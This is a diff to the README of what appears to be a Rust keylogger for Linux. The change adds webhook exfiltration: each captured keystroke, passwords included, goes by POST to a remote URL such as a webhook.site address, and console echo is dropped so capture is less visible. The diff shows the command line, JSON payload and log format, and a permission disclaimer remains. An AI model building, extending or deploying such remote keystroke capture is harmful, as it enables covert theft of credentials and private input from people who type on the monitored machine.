@@ -16,6 +16,8 @@ Unauthorized use of keyloggers may be illegal in your jurisdiction. Always obtai
 - 🌐 **UTF-8 Default**: Configured for en_US.UTF-8 locale
 - 📝 **Detailed Logging**: Timestamps and device information for each keystroke
 - ⚡ **Low Overhead**: Efficient event-driven architecture
+- 🔗 **Webhook Support**: Send keystrokes to a webhook URL via POST requests
+- 🔒 **Secure Output**: Keystrokes are not printed to console, only saved to file and optionally sent to webhook
 
 ## Platform Support
 
@@ -95,13 +97,16 @@ cargo build --release --target x86_64-apple-darwin
 
 ### Linux
 ```bash
-# With sudo (recommended)
+# Basic usage (logs to keylog.txt only)
 sudo ./target/release/rust-key
+
+# With webhook support (sends keys to webhook URL via POST)
+sudo ./target/release/rust-key https://webhook.site/your-unique-id
 
 # Or add your user to the input group first
 sudo usermod -a -G input $USER
 # Log out and log back in
-./target/release/rust-key
+./target/release/rust-key [WEBHOOK_URL]
 ```
 
 The program will:
@@ -110,6 +115,9 @@ The program will:
 3. Display detected keyboard devices with their type (USB/Internal)
 4. Start monitoring all keyboards
 5. Log keystrokes to `keylog.txt` with timestamps
+6. Send keystrokes to webhook URL if provided (via POST request)
+
+**Note:** Keystrokes are no longer printed to the console for security reasons. They are only saved to `keylog.txt` and optionally sent to a webhook.
 
 ### Windows
 ```bash
@@ -130,6 +138,7 @@ Keystrokes are logged to `keylog.txt` in the following format:
 ```
 === Keylogger Started at 2024-01-01 12:00:00.000 ===
 Locale: en_US.UTF-8
+Webhook URL: https://webhook.site/your-unique-id
 Monitoring device: AT Translated Set 2 keyboard (/dev/input/event3)
 Monitoring device: USB Keyboard (/dev/input/event4)
 [2024-01-01 12:00:05.123] [USB Keyboard] Key: h
@@ -139,6 +148,15 @@ Monitoring device: USB Keyboard (/dev/input/event4)
 [2024-01-01 12:00:05.567] [USB Keyboard] Key: o
 ```
 
+If a webhook URL is provided, each keystroke is also sent as a POST request with the following JSON payload:
+```json
+{
+  "timestamp": "2024-01-01 12:00:05.123",
+  "device": "USB Keyboard",
+  "key": "h"
+}
+```
+
 ## Technical Details
 
 ### Linux Implementation
@@ -146,6 +164,9 @@ Monitoring device: USB Keyboard (/dev/input/event4)
 - Automatically detects USB keyboards by checking physical path
 - Non-blocking event loop for efficient processing
 - Supports multiple simultaneous keyboards
+- Keystrokes are saved to `keylog.txt` but not printed to console
+- Optional webhook support via `reqwest` crate for HTTP POST requests
+- Webhook requests are sent asynchronously to avoid blocking the keylogger
 - Maps key codes to characters including:
   - Letters (a-z)
   - Numbers (0-9)
@@ -181,6 +202,8 @@ The program requires access to `/dev/input/event*` devices. You can either:
 
 - This tool captures all keyboard input, including passwords
 - The log file contains sensitive information
+- If using webhook functionality, ensure the webhook URL is secure (HTTPS recommended)
+- Webhook data is transmitted over the network - use trusted endpoints only
 - Always secure the log file with appropriate permissions
 - Delete or encrypt logs when no longer needed
 - Only use on systems you own or have explicit permission to monitor
@@ -192,6 +215,8 @@ The program requires access to `/dev/input/event*` devices. You can either:
 - ✅ USB keyboard detection complete
 - ✅ en_US.UTF-8 locale support complete
 - ✅ Cross-platform dependency structure complete
+- ✅ Webhook support for sending keystrokes via HTTP POST
+- ✅ Removed console output of keystrokes for security
 - 🚧 Windows implementation (stub ready)
 - 🚧 macOS implementation (stub ready)
 
@@ -201,7 +226,7 @@ Contributions are welcome! Areas for contribution:
 - Complete Windows implementation using winapi
 - Complete macOS implementation using Core Graphics
 - Add encryption for log files
-- Add network transmission capabilities
+- Add support for additional webhook formats or authentication methods
 - Improve key mapping for different keyboard layouts
 - Add configuration file support
 
